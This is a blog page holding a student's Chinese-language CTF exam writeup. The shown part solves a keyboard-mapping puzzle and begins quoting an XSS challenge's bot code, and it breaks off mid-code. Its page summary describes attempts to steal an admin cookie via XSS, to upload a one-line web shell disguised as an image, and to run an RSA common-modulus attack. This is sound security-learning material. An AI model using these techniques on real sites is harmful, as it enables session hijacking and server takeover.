@@ -1,0 +1,593 @@
+<!DOCTYPE html><html lang="zh-TW" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SCIST S4 資訊安全期末考 Writeup | CX330 Odyssey</title><meta name="keywords" content="資安,SCIST"><meta name="author" content="CX330"><meta name="copyright" content="CX330"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#18171d"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SCIST S4 資訊安全期末考 Writeup"><meta name="application-name" content="SCIST S4 資訊安全期末考 Writeup"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#18171d"><meta property="og:type" content="article"><meta property="og:title" content="SCIST S4 資訊安全期末考 Writeup"><meta property="og:url" content="https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/index.html"><meta property="og:site_name" content="CX330 Odyssey"><meta property="og:description" content="我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！"><meta property="og:locale" content="zh-TW"><meta property="og:image" content="https://cx330.tw/images/default_cover.webp"><meta property="article:author" content="CX330"><meta property="article:tag" content="CX330, 陳子雋, CX330 universe, CX330 Blog, Blog, CTF, CX330 hacker, hacker, 資安, 程式設計, 程式設計師, 程式設計博客, 程式設計部落格, 程式設計日誌, 程式設計師日誌, 程式設計部落格日誌, 程式設計部落格博客, 程式設計部落格網站, 程式設計網站, 程式設計部落格, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部落格網站, 程式設計部"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cx330.tw/images/default_cover.webp"><meta name="description" content="我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！"><link rel="shortcut icon" href="/assets/favicon.ico"><link rel="canonical" href="https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Anton+SC&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: {"enable":true,"title":"与数百名博主无限进步","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: {"mode":"both","api":"https://img2color-go.vercel.app/api?img=","cover_change":false},
+  authorStatus: {"skills":["Hacker","CTFer","Developer","Programmer",1337]},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查詢的內容：${query}"}},
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"轉為繁體","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '複製成功',
+    error: '複製錯誤',
+    noSupport: '瀏覽器不支援'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '剛剛',
+    min: '分鐘前',
+    hour: '小時前',
+    day: '天前',
+    month: '個月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: CX330","link":"連結: ","source":"來源: CX330 Odyssey","info":"著作權歸作者所有。商業轉載請聯絡作者獲得授權，非商業轉載請註明出處。","copySuccess":"複製成功，複製和轉載請標注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切換為繁體","cht_to_chs":"你已切換為簡體","day_to_night":"你已切換為深色模式","night_to_day":"你已切換為淺色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'CX330 Odyssey',
+  title: 'SCIST S4 資訊安全期末考 Writeup',
+  postAI: '',
+  pageFillDescription: 'Welcome, XSSER, Uploader, Common modulus, 參賽心得, 參考資料區我在參加了課程雖然常常聽不懂但感覺還是收穫不少這是上學期最後的一個考試透過考試來審查是否可以進入下學期的課程很幸運的我有過雖然我覺得我還得多練所以以下是一些我有進展的題目的如果發現有錯誤或是哪裡不足可以在底下留言區留言我會十分感激這題我們可以從開發者工具發現類似以下的元素再透過以下的代碼可以找到真正的每個標籤的屬性是由兩個字符所組成以上面的標籤為例當我們按著的時候按下數字按鍵實際的會是也就是為的位置但當我們只是單純按下數字按鍵的時候會是就是為的位置知道了這個特性後翻找到一份文件將其打開會發現第一行有個註解以下我們用一般打字的方法用切換大小寫嘗試輸入經過以上的轉換便可以得到看了題目給的檔案可以發現是在函數裡面被設定的如下而要觸發這個函數必須在回報的地方輸入一個正確合法的才會執行函數程式碼如下接著先在網站嘗試隨意一個正常的會發現網址變成了以下的形式其中路徑後面的便是一個合法的到了這邊我原本以為是要把合法的和的結合在一起並在的地方提交但經過助教的提示之後知道應該是要把提交在的內文所以我開始重新研究一次的程式碼發現了之前沒仔細看到可能可以注入的地方如下在這段程式碼中可以看到我們提交的會被夾在標籤中解析所以我嘗試注入發現不能執行因為裡面限制了允許的標籤白名單只有這五個標籤能使用其餘的標籤會被掉知道可以用的標籤後我使用了標籤提交嘗試執行如下發現只會被解析成而移動滑鼠到上面的時候也確實會執行因此接下來要做的就是修改並再提交後去的地方提交讓去執行到我們提交的腳本就可以得到了我用在本地先架了個伺服器並且嘗試透過其獲取如下但是因為屬性需要有滑鼠滑過即便我把標籤調整的很大但因為函數不會有滑鼠滑過所以還是不會執行很可惜到了截止的最後還是沒能找出正確的獲取到最後來談談這個漏洞在真實世界可能的危害題目在每次回報完後都會提示這告訴我們如果真實世界中有人利用漏洞注入了惡意代碼而當系統管理員去的時候自己的可能就會被利用讓有心人士可以在不知道帳號密碼的情況下以的權限登入系統在這題裡面我先嘗試上傳了一張正常的圖片發現網頁會呈現這樣的狀態我一開始先用了課程中教過的一句話木馬來嘗試上傳我上傳的是檔結果系統會回應這表示前端會檢測是否為合法的上傳檔案類型我又嘗試把檔名修改為再進行上傳結果系統的回應是表示後端也有檢測他是否為檔案後來又嘗試了很多其他的方法包括在前面加上嘗試讓系統解析為檔但得到的回應都跟前面差不多最後在經過一番搜尋查找資料後發現只剩下一個方法就是上傳圖片馬所謂的圖片馬就是把圖片和木馬組合在一起上傳於是我準備了一張正常的和惡意的代碼將其放在同一個路徑底下接著利用以下的指令將其組合為惡意圖片馬接著我將上傳發現系統回應到這邊比賽就結束了結果最後還是沒能成功地取得這題的題目給了三個公鑰三個密文還有一個質數因子相乘如果有其中兩個是互質也就是的話就可以利用一般的共模攻擊去求得明文就是利用會有一組和滿足的條件加上一點計算去找出原本的如下已知可惜這題的三個都不是互質的所以要用其他的方法我就找到了一篇文章裡面的方法是這樣所以只要把最後算出來的再開次方根就能找到明文於是我寫了下面的腳本只不過最後的答案是錯誤的沒能找到正確的可能是因為本題的太大還要找其他的算法參賽心得這次算是我第一次花了那麼多的時間打比賽之前可能就是自己在網路上解解題甚麼的總的來說還是很有趣的一次體驗而參加完這次的比賽我也更加地意識到自己的不足真的還有很多可以進步練習的地方即便可能有點被打擊信心但我也不會氣餒我要更努力的練習沒事就多解解題甚麼的增強自己的實力希望可以在之後的比賽表現得越來越好參考資料區文件上傳漏洞總結串流加密法童舒晧資安資源整理教學安全工具使用关于共模攻击不互素的解法文件上传漏洞进阶教程白名单绕过图片马制作图片马执行',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-04 13:42:47',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/assets/me.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">CX330 Odyssey</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-list-ul faa-tada" style="font-size: 0.9em;"></i><span> Tree</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Friends</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> Sites</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-message faa-tada" style="font-size: 0.9em;"></i><span> Message board</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=7032963191&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> Music Hall</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> Moments</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-book faa-tada" style="font-size: 0.9em;"></i><span> Chasing</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> Album Set</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> Me</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-dice faa-tada" style="font-size: 0.9em;"></i><span> Random</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜尋</span></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="/assets/buymeacoffee.png" target="_blank"><img class="post-qr-code-img" alt="Buy Me a Coffee" src="/assets/buymeacoffee.png"/></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="/assets/me.jpg" target="_blank"><img class="post-qr-code-img" alt="CX330" src="/assets/me.jpg"/></a><div class="post-qr-code-desc">CX330</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新評論</span></div><div class="aside-list"><span>正在載入中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">音乐</div><span class="author-content-item-title">灵魂的碰撞💥</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>歸檔</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>資安</span></a><a class="article-meta__tags" href="/tags/SCIST/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>SCIST</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SCIST S4 資訊安全期末考 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">發表於</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-28T05:33:42.000Z" title="發表於 2024-05-28 13:33:42">2024-05-28</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新於</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-07-04T05:42:47.474Z" title="更新於 2024-07-04 13:42:47">2024-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字數總計:</span><span class="word-count" title="文章字数">2.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">閱讀時長:</span><span>8分鐘</span></span><span class="post-meta-separator"></span><span id="" data-flag-title="SCIST S4 資訊安全期末考 Writeup"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">閱讀量:</span><span class="waline-pageview-count" data-path="/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/" title="访问量"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为Taiwan"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>Taiwan</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/images/default_cover.webp"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url">資安</a><a href="/tags/SCIST/" tabindex="-1" itemprop="url">SCIST</a><h1 id="CrawlerTitle" itemprop="name headline">SCIST S4 資訊安全期末考 Writeup</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">CX330</span><time itemprop="dateCreated datePublished" datetime="2024-05-28T05:33:42.000Z" title="發表於 2024-05-28 13:33:42">2024-05-28</time><time itemprop="dateCreated datePublished" datetime="2024-07-04T05:42:47.474Z" title="更新於 2024-07-04 13:42:47">2024-07-04</time></header><p>我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！</p>
+<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p>這題我們可以從開發者工具發現類似以下的元素。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;key--double&quot;</span> <span class="attr">data-key</span>=<span class="string">&quot;49&quot;</span> <span class="attr">data-input</span>=<span class="string">&quot;?F&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>!<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再透過以下的 index.js 代碼可以找到真正的 input。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key.<span class="title function_">hasAttribute</span>(<span class="string">&quot;data-input&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">shiftKey</span>) &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        typingElement.<span class="property">innerHTML</span> = msg.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&amp;nbsp;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>每個標籤的 data-input 屬性是由兩個字符所組成，以上面的 html 標籤為例，當我們按著 shift 的時候按下數字 1 按鍵，實際的 input 會是<code>?</code>，也就是 index 為 0 的位置；但當我們只是單純按下數字 1 按鍵的時候，input 會是<code>F</code>，就是 index 為 1 的位置。</p>
+<p>知道了這個特性後，翻找到一份 index.css 文件，將其打開會發現第一行有個註解，以下:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Passpharse : &quot;JP Jf3j-F@%#$4H%xw&quot; */</span></span><br></pre></td></tr></table></figure>
+
+<p>我們用一般打字的方法，用 shift 切換大小寫，嘗試輸入 Passphrase。經過以上的轉換，便可以得到 flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = SCIST&#123;G0oD_1u(k_!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="XSSER"><a href="#XSSER" class="headerlink" title="XSSER"></a>XSSER</h1><p>看了題目給的 app.js 檔案，可以發現 Flag 是在 visit 函數裡面被設定的，如下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">noteId</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:3000/note/<span class="subst">$&#123;noteId&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="attr">path</span>: <span 